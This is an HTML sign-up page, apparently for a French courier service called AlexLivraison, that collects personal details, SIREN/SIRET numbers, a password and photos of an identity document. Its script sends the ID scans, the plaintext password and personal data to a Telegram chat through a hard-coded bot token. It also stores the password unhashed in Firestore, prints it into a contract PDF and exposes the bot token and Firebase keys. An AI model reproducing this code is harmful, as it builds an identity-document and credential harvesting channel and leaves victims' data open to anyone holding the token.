<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
<title>Devenir Coursier - AlexLivraison</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<style>
  :root{--violet:#6b23ff;--violet-dark:#32006b;--green:#4caf50;--glass:rgba(255,255,255,0.95);}
  html,body{height:100%;margin:0;padding:0;overflow-x:hidden;}
  body{
    font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
    background:linear-gradient(135deg,#32006b 0%,#7a2cf5 50%,#43dfb8 100%);
    color:#222;
    min-height:100vh;
  }
  *{box-sizing:border-box}
  .wrap{max-width:800px;margin:0 auto;padding:20px;}
  
  .topbar {
    position: sticky;
    top: 0;
    z-index: 100;
    backdrop-filter: blur(15px);
    background: rgba(20,0,45,0.85);
    padding: 10px 20px;
    border-bottom: 1px solid rgba(255,255,255,0.1);
    display: grid;
    grid-template-columns: auto 1fr auto; 
    align-items: center;
    gap: 15px;
  }
  .topbar-logo {width: 45px; height: 45px; border-radius: 50%; border: 2px solid #fff; object-fit: cover;}
  
  .topbar-title {
      text-align: center; color: #fff; font-weight: bold; font-size: 1.3em;
      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  }
  .anim-bike { display: inline-block; animation: ride 2s infinite ease-in-out; }
  .anim-car { display: inline-block; animation: drive 2s infinite ease-in-out; }
  @keyframes ride { 0% { transform: translateX(0) rotate(0deg); } 50% { transform: translateX(5px) rotate(5deg); } 100% { transform: translateX(0) rotate(0deg); } }
  @keyframes drive { 0% { transform: translateX(0); } 50% { transform: translateX(-5px); } 100% { transform: translateX(0); } }

  .btn-back{color:#fff;text-decoration:none;font-weight:bold;padding:8px 15px;background:rgba(255,255,255,0.2);border-radius:8px;display:flex;align-items:center;gap:5px}
  
  .card{background:var(--glass);border-radius:20px;padding:30px;margin-bottom:25px;box-shadow:0 20px 50px rgba(0,0,0,0.2);backdrop-filter:blur(10px);animation:fadeIn 0.5s ease;}
  h1{color:#fff;text-align:center;margin-bottom:30px;text-shadow:0 2px 10px rgba(0,0,0,0.3);font-size:2.2em}
  h2{color:#32006b;margin-top:0;border-bottom:2px solid #eee;padding-bottom:10px;margin-bottom:20px;}
  
  .input-group{margin-bottom:15px;}
  label{display:block;margin-bottom:8px;font-weight:600;color:#555;}
  input,select,textarea{width:100%;padding:14px;border:1px solid #ddd;border-radius:10px;font-size:16px;background:#f9f9f9;}
  input:focus,select:focus{border-color:#6b23ff;box-shadow:0 0 0 3px rgba(107,35,255,0.1);background:#fff;}
  
  .file-upload-box {
      border: 2px dashed #bbb; padding: 15px; border-radius: 10px; background: #f8f9fa; text-align: center; margin-bottom: 10px;
  }
  .file-upload-box:hover { border-color: var(--violet); background: #fff; }
  
  .capacity-msg {
      margin-top: 10px; padding: 12px; background: rgba(107, 35, 255, 0.1);
      border-left: 4px solid var(--violet); border-radius: 8px; color: var(--violet-dark);
      font-weight: bold; font-size: 0.95em; animation: fadeIn 0.3s ease;
  }

  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:15px;}
  .btn-primary{width:100%;padding:16px;background:linear-gradient(90deg,#6b23ff,#8e5aff);color:#fff;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:20px;box-shadow:0 5px 15px rgba(107,35,255,0.3);transition:0.3s;display:flex;align-items:center;justify-content:center;gap:10px}
  .btn-primary:hover{transform:translateY(-2px);}
  .btn-continue{width:100%;padding:16px;background:#4caf50;color:#fff;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:15px;display:none;box-shadow:0 5px 15px rgba(76,175,80,0.3)}
  
  canvas#signature{width:100%;height:200px;border:2px dashed #bbb;border-radius:10px;background:#fff;cursor:crosshair;}
  .hidden{display:none;}
  .status-msg{text-align:center;margin-top:15px;font-weight:bold;padding:10px;border-radius:8px;background:#fff;}
  .success {background: #dcfce7; color: #166534;}
  .error {background: #fee2e2; color: #991b1b;}
  
  @media(max-width:600px){.grid2{grid-template-columns:1fr;}}
  @keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
</style>
</head>
<body>

<div class="topbar">
  <img src="logo.jpg" alt="Logo" class="topbar-logo">
  <div class="topbar-title"><span class="anim-bike">üö¥üèª‚Äç‚ôÇÔ∏è</span> Alexlivraison<span class="anim-car">üöó</span></div>
  <a href="index.html" class="btn-back">üè† Retour</a>
</div>

<main class="wrap">
  <h1>Devenir Coursier Ind√©pendant <span class="emoji-anim">üöÄ</span></h1>

  <section id="step1" class="card">
    <h2>1. Informations Personnelles</h2>
    <div class="grid2">
      <div class="input-group"><label>Pr√©nom</label><input id="c_firstname" placeholder="Votre pr√©nom"></div>
      <div class="input-group"><label>Nom</label><input id="c_lastname" placeholder="Votre nom"></div>
    </div>

    <div class="input-group">
        <label>Civilit√© (Genre)</label>
        <select id="c_gender">
            <option value="M.">Monsieur (M.)</option>
            <option value="Mme">Madame (Mme)</option>
        </select>
    </div>
    
    <div class="grid2">
      <div class="input-group"><label>T√©l√©phone (Mobile)</label><input id="c_phone" type="tel"></div>
      <div class="input-group"><label>E-mail (Pour la connexion)</label><input id="c_email" type="email"></div>
    </div>

    <div class="input-group" style="border: 2px solid #6b23ff; padding: 15px; border-radius: 10px; background: #f3e5f5;">
      <label style="color:#6b23ff">üîê Cr√©ez votre Mot de Passe</label>
      <input id="c_password" type="text" placeholder="Minimum 6 caract√®res" style="font-weight:bold;">
    </div>

    <div class="input-group"><label>Adresse compl√®te</label><input id="c_addr" placeholder="Rue, Code Postal, Ville"></div>

    <h2>Informations Pro & V√©hicule</h2>
    <div class="grid2">
      <div class="input-group"><label>Num√©ro SIREN</label><input id="c_siren" maxlength="9"></div>
      <div class="input-group"><label>Num√©ro SIRET</label><input id="c_siret" maxlength="14"></div>
    </div>
      
    <div class="input-group">
      <label>V√©hicule</label>
      <select id="c_vehicle">
        <option value="Velo">V√©lo üö≤</option>
        <option value="Scooter">Scooter üõµ</option>
        <option value="Voiture">Voiture üöó</option>
        <option value="Trotinette">Trotinette üõ¥</option>
      </select>
      <div id="vehicle-capacity-msg" class="capacity-msg hidden"></div>
    </div>

    <h2>Documents d'Identit√©</h2>
    <div class="input-group">
      <label>Type de document</label>
      <select id="c_doc_type">
        <option value="CNI">Carte Nationale d'Identit√©</option>
        <option value="Passeport">Passeport</option>
        <option value="Titre de s√©jour">Titre de s√©jour</option>
        <option value="Permis">Permis de conduire</option>
      </select>
    </div>

    <div class="grid2">
        <div class="file-upload-box">
            <label style="cursor:pointer">üì∏ RECTO (Face avant)</label>
            <input type="file" id="c_doc_front" accept="image/*" required>
        </div>
        <div class="file-upload-box">
            <label style="cursor:pointer">üì∏ VERSO (Face arri√®re)</label>
            <input type="file" id="c_doc_back" accept="image/*" required>
        </div>
    </div>

    <button id="btn_step1" class="btn-primary">Suivant ‚û°Ô∏è</button>
  </section>

  <section id="step2" class="card hidden">
    <h2>2. Contrat de Prestation</h2>
    <p style="font-size:14px;color:#666;margin-bottom:20px;line-height:1.5;">
      En signant ce document, vous confirmez exercer en tant que prestataire ind√©pendant.
    </p>
    
    <div class="grid2">
      <div class="input-group"><label>Lieu de signature</label><input id="sign_place" value="Toulon"></div>
      <div class="input-group"><label>Date</label><input id="sign_date" type="date"></div>
    </div>

    <label>Votre signature :</label>
    <canvas id="signature"></canvas>
    <button onclick="clearSig()" style="margin-top:10px;padding:8px;background:#eee;border:none;border-radius:5px;cursor:pointer">Effacer</button>

    <div style="margin-top:20px;display:flex;align-items:center;gap:10px">
      <input type="checkbox" id="agree" style="width:auto">
      <label for="agree" style="margin:0">Je certifie l'exactitude des informations.</label>
    </div>

    <button id="gen_pdf" class="btn-primary">‚úçÔ∏è Signer et Envoyer</button>
    <div id="final-status" class="status-msg hidden"></div>
    <button id="btn_continue" class="btn-continue" onclick="window.location.href='login-coursier.html'">Continuer vers les R√®gles üöÄ</button>
  </section>
</main>

<img src="logo.jpg" id="img-logo" style="display:none">
<img src="alex444.jpg" id="img-stamp" style="display:none">
<img src="sinature-alex.jpg" id="img-alex-sig" style="display:none">

<script>
const firebaseConfig={apiKey:"AIzaSyAWagPwv5Skh_EHfdcnFTYeG-xltRM7yPc",authDomain:"alex-livraison.firebaseapp.com",projectId:"alex-livraison",storageBucket:"alex-livraison.firebasestorage.app",messagingSenderId:"937475497279",appId:"1:937475497279:web:62dc9eba8e77a5113ec78a"};
firebase.initializeApp(firebaseConfig);
const db=firebase.firestore();

const BOT = "8003065650:AAGJH_PRNHQ7jVDm9q96G6zlHt-IXkxKHnA";
const CHAT = "7129872491";

const s1 = document.getElementById('step1');
const s2 = document.getElementById('step2');
const inputs = ['c_firstname','c_lastname','c_phone','c_addr','c_siren','c_siret','c_email','c_password'];

const vehicleSelect = document.getElementById('c_vehicle');
const capacityMsg = document.getElementById('vehicle-capacity-msg');

const vehicleCapacities = {
  'Velo': 'üö¥‚Äç‚ôÇÔ∏è V√©lo : Capacit√© max = Taille S (Petits colis)',
  'Trotinette': 'üõ¥ Trotinette : Capacit√© max = Taille S (Petits colis)',
  'Scooter': 'üõµ Scooter : Capacit√© max = Taille M (Colis moyens)',
  'Voiture': 'üöó Voiture : Capacit√© max = Taille XL (Tous colis)'
};
const pdfVehicleInfos = {
  'Velo': 'Velo (Max: Taille S)',
  'Trotinette': 'Trotinette (Max: Taille S)',
  'Scooter': 'Scooter (Max: Taille M)',
  'Voiture': 'Voiture (Max: Taille XL)'
};

vehicleSelect.addEventListener('change', ()=>{
    const v = vehicleSelect.value;
    if(vehicleCapacities[v]){
        capacityMsg.innerText = vehicleCapacities[v];
        capacityMsg.classList.remove('hidden');
    } else { capacityMsg.classList.add('hidden'); }
});
vehicleSelect.dispatchEvent(new Event('change'));

document.getElementById('btn_step1').onclick = () => {
  for(let i of inputs) if(!document.getElementById(i).value.trim()) return alert("Veuillez remplir tous les champs obligatoires.");
  if(!document.getElementById('c_doc_front').files[0] || !document.getElementById('c_doc_back').files[0]) 
      return alert("Veuillez ajouter les photos RECTO et VERSO de votre document.");
  
  s1.classList.add('hidden');
  s2.classList.remove('hidden');
  window.scrollTo(0,0);
  resizeCanvas();
};

const cvs = document.getElementById('signature');
const ctx = cvs.getContext('2d');
let dr = false;

function resizeCanvas(){
  const r = cvs.getBoundingClientRect();
  cvs.width = r.width;
  cvs.height = 200;
  ctx.fillStyle = '#ffffff';
  ctx.fillRect(0,0,cvs.width,cvs.height);
}
window.addEventListener('resize', resizeCanvas);

function getPos(e){
  const r = cvs.getBoundingClientRect();
  const t = e.touches ? e.touches[0] : e;
  return {x: t.clientX - r.left, y: t.clientY - r.top};
}

cvs.addEventListener('mousedown', e => {dr=true; ctx.beginPath(); ctx.moveTo(getPos(e).x, getPos(e).y)});
cvs.addEventListener('mousemove', e => {if(dr){ctx.lineTo(getPos(e).x, getPos(e).y); ctx.stroke()}});
cvs.addEventListener('mouseup', () => dr=false);
cvs.addEventListener('touchstart', e => {e.preventDefault(); dr=true; ctx.beginPath(); ctx.moveTo(getPos(e).x, getPos(e).y)});
cvs.addEventListener('touchmove', e => {e.preventDefault(); if(dr){ctx.lineTo(getPos(e).x, getPos(e).y); ctx.stroke()}});
cvs.addEventListener('touchend', () => dr=false);

window.clearSig = () => {
  ctx.fillStyle = '#ffffff';
  ctx.fillRect(0,0,cvs.width,cvs.height);
  ctx.beginPath();
};

const today = new Date().toISOString().split('T')[0];
const dInput = document.getElementById('sign_date');
dInput.value = today;
dInput.min = today;
dInput.max = today;
dInput.addEventListener('keydown', e => e.preventDefault());

function makeCircle(imgId) {
    const img = document.getElementById(imgId);
    const c = document.createElement('canvas');
    const s = Math.min(img.width, img.height);
    c.width = s; c.height = s;
    const x = c.getContext('2d');
    x.fillStyle = '#ffffff';
    x.fillRect(0, 0, s, s);
    x.beginPath();
    x.arc(s/2, s/2, s/2, 0, Math.PI*2);
    x.closePath();
    x.save();
    x.clip();
    x.drawImage(img, (img.width-s)/2, (img.height-s)/2, s, s, 0, 0, s, s);
    x.restore();
    return c.toDataURL('image/jpeg', 0.95);
}

document.getElementById('gen_pdf').onclick = async () => {
  if(!document.getElementById('agree').checked) return alert("Veuillez accepter les conditions.");
  
  const btn = document.getElementById('gen_pdf');
  const btnCont = document.getElementById('btn_continue');
  const status = document.getElementById('final-status');
  
  btn.disabled = true;
  btn.innerText = "Envoi en cours...";
  status.classList.remove('hidden');
  status.innerText = "Cr√©ation du compte et des documents...";

  const {jsPDF} = window.jspdf;
  const doc = new jsPDF();
  
  const gender = document.getElementById('c_gender').value;
  const fname = document.getElementById('c_firstname').value;
  const lname = document.getElementById('c_lastname').value;
  const fullName = fname + " " + lname;
  const email = document.getElementById('c_email').value;
  const password = document.getElementById('c_password').value;
  const siren = document.getElementById('c_siren').value;
  const siret = document.getElementById('c_siret').value;
  const addr = document.getElementById('c_addr').value;
  const vehicle = document.getElementById('c_vehicle').value;
  const date = document.getElementById('sign_date').value;
  const place = document.getElementById('sign_place').value;

  try {
    await db.collection('couriers').add({
        email: email.toLowerCase(),
        password: password, 
        fullName: fullName,
        gender: gender,
        siren: siren,
        siret: siret,
        vehicle: vehicle,
        status: 'pending', 
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
    });
  } catch (err) {
    alert("Erreur lors de la cr√©ation du compte: " + err.message);
    btn.disabled = false;
    return;
  }

  try {
    const logoData = makeCircle('img-logo');
    doc.addImage(logoData,'JPEG',160,10,30,30);
  } catch(e){}

  doc.setFontSize(18); doc.setFont("helvetica","bold");
  doc.text("CONTRAT DE PRESTATION DE SERVICES",20,30);
  doc.text("COURSIER IND√âPENDANT",20,38);
  doc.setLineWidth(0.5); doc.line(20,45,190,45);

  doc.setFontSize(11); doc.setFont("helvetica","normal");
  let y = 55;
  const addL = (txt, bold=false) => {
    doc.setFont("helvetica", bold?"bold":"normal");
    doc.text(txt, 20, y);
    y += 6;
  };

  addL("ENTRE LES SOUSSIGN√âS :", true);
  y+=2;
  addL("1. La plateforme AlexLivraison (Repr√©sent√©e par Atabek Zakirov).");
  addL("Ci-apr√®s d√©nomm√©e ¬´ La Plateforme ¬ª.");
  y+=4;
  addL("ET :", true);
  y+=2;
  addL(`2. ${gender} ${fullName}`);
  addL(`   SIREN : ${siren} / SIRET : ${siret}`);
  addL(`   Adresse : ${addr}`);
  addL(`   Email : ${email}`);
  
  doc.setTextColor(100, 0, 200); 
  doc.setFont("helvetica", "bold");
  doc.text(`   Code PIN (Mot de passe) : ${password}`, 20, y);
  y += 6;
  doc.setTextColor(0, 0, 0);
  doc.setFont("helvetica", "normal");

  const vInfo = pdfVehicleInfos[vehicle] || vehicle;
  addL(`   V√©hicule d√©clar√© : ${vInfo}`);
  addL("Ci-apr√®s d√©nomm√© ¬´ Le Prestataire ¬ª.");
  
  y+=8;
  doc.setFontSize(12); doc.setFont("helvetica","bold");
  doc.text("CONDITIONS G√âN√âRALES :", 20, y); y+=6;
  doc.setFontSize(10); doc.setFont("helvetica","normal");
  
  const clauses = [
    "Article 1 - Objet : Le Prestataire s'engage √† effectuer des livraisons pour le compte",
    "des clients de la Plateforme en toute ind√©pendance.",
    "",
    "Article 2 - Statut : Le Prestataire d√©clare √™tre travailleur ind√©pendant.",
    "",
    "Article 3 - Obligations : Le Prestataire s'engage √† respecter le code de la route",
    "et √† disposer d'un v√©hicule en bon √©tat.",
    "",
    "Article 4 - R√©mun√©ration : Selon le bar√®me en vigueur sur l'application.",
    "",
    "Article 5 - Confidentialit√© : Le Prestataire s'engage √† prot√©ger les donn√©es clients."
  ];
  clauses.forEach(line => addL(line));

  y+=15;
  doc.setFontSize(11);
  doc.text(`Fait √† ${place}, le ${date}`, 20, y);
  y+=10;
  
  doc.text("Le Prestataire :", 20, y);
  doc.text("La Plateforme (AlexLivraison) :", 120, y);
  y+=10;
  
  try { doc.addImage(cvs.toDataURL('image/jpeg'), 'JPEG', 20, y, 50, 30); } catch(e){}
  try {
    const sigAlex = document.getElementById('img-alex-sig');
    doc.addImage(sigAlex, 'JPEG', 120, y, 50, 30);
    const stamp = makeCircle('img-stamp');
    doc.addImage(stamp, 'JPEG', 150, y, 30, 30);
  } catch(e){}

  doc.text("Valid√©", 140, y+40);

  const pdfBlob = doc.output('blob');
  const docType = document.getElementById('c_doc_type').value;
  const frontFile = document.getElementById('c_doc_front').files[0];
  const backFile = document.getElementById('c_doc_back').files[0];

  status.innerText = "Envoi des fichiers (3 √©tapes)...";

  const fd1 = new FormData();
  fd1.append('chat_id', CHAT);
  fd1.append('caption', `üÜî NOUVEAU COURSIER\n${docType} (RECTO)\nüë§ ${gender} ${fullName}\nüìß ${email}\nüîë ${password}`);
  fd1.append('document', frontFile);

  const fd2 = new FormData();
  fd2.append('chat_id', CHAT);
  fd2.append('caption', `üÜî ${docType} (VERSO)\nüë§ ${fullName}`);
  fd2.append('document', backFile);

  const fd3 = new FormData();
  fd3.append('chat_id', CHAT);
  fd3.append('caption', `üìÑ CONTRAT SIGN√â\nüë§ ${fullName}\nüè¢ SIREN: ${siren}\nüõµ ${vehicle}`);
  fd3.append('document', new File([pdfBlob], `Contrat_${lname}.pdf`, {type: 'application/pdf'}));

  try {
    await fetch(`https://api.telegram.org/bot${BOT}/sendDocument`, {method: 'POST', body: fd1});
    await fetch(`https://api.telegram.org/bot${BOT}/sendDocument`, {method: 'POST', body: fd2});
    await fetch(`https://api.telegram.org/bot${BOT}/sendDocument`, {method: 'POST', body: fd3});
    
    doc.save(`Contrat_AlexLivraison_${lname}.pdf`);
    
    status.innerText = "‚úÖ Inscription r√©ussie !";
    status.className = "status-msg success";
    btn.style.display = "none";
    btnCont.style.display = "block";
    
    alert("Votre compte a √©t√© cr√©√© ! Appuyez sur 'Continuer' pour lire les r√®gles.");
    
  } catch(e) {
    console.error(e);
    status.innerText = "‚ùå Erreur r√©seau. V√©rifiez votre connexion.";
    status.className = "status-msg error";
    btn.disabled = false;
    btn.innerText = "R√©essayer";
  }
};
</script>
</body>
</html> 
